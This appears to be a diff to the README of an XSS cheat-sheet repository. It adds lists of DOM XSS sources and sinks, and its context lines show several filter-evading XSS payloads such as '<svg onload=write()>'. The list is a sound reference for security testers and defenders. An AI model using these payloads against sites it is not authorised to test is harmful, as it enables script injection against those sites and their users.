@@ -30,6 +30,57 @@ Put this repo on watch. I will be updating it regularly.
 ### Awesome XSS Mind Maps
 A beutiful XSS mind map by Jack Masa, [here](https://github.com/s0md3v/AwesomeXSS/blob/master/Database/jackmasa-mind-map.png)
 
+### Awesome DOM XSS
+
+- Does your input go into a sink? `Vulnerable`
+- It doesn't? `Not vulnerable`
+
+**Source**: An input that could be controlled by an external (untrusted) source.
+
+```
+document.URL
+document.documentURI
+document.URLUnencoded (IE 5.5 or later Only)
+document.baseURI
+location
+location.href
+location.search
+location.hash
+location.pathname
+document.cookie
+document.referrer
+window.name
+history.pushState()
+history.replaceState()
+localStorage
+sessionStorage
+```
+
+**Sink**: A potentially dangerous method that could lead to a vulnerability. In this case a DOM Based XSS.
+
+```
+eval
+Function
+setTimeout
+setInterval
+setImmediate
+execScript
+crypto.generateCRMFRequest
+ScriptElement.src
+ScriptElement.text
+ScriptElement.textContent
+ScriptElement.innerText
+anyTag.onEventName
+document.write
+document.writeln
+anyElement.innerHTML
+Range.createContextualFragment
+window.location
+document.location
+```
+
+This comprehensive list of sinks and source is taken from [domxsswiki](https://github.com/wisec/domxsswiki).
+
 ### Awesome Payloads
 ```
 <d3"<"/onclick="1>[confirm``]"<">z
@@ -53,6 +104,7 @@ A beutiful XSS mind map by Jack Masa, [here](https://github.com/s0md3v/AwesomeXS
 <x oncut=alert()>x
 <svg onload=write()>
 ```
+
 ### Awesome Polyglots
 
 Here's an XSS polyglot that I made which can break out of 20+ contexts:
